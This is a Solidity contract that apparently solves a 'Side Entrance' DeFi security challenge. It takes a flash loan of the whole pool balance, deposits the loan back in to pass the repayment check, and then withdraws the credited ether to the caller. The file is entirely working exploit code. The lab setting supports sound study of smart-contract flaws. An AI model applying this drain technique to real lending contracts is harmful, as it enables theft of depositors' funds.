// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntranceLenderPool {

  address public target;
  constructor(address _target) {
    target = _target;

  }

  function attack() public {
    SideEntranceLenderPool(target).flashLoan(target.balance);
  }
  function execute() external payable {
    SideEntranceLenderPool(target).deposit{value: msg.value}();
  }

  function withdraw() public {
    SideEntranceLenderPool(target).withdraw();
    payable(msg.sender).transfer(address(this).balance);
  }

  receive() external payable {}

}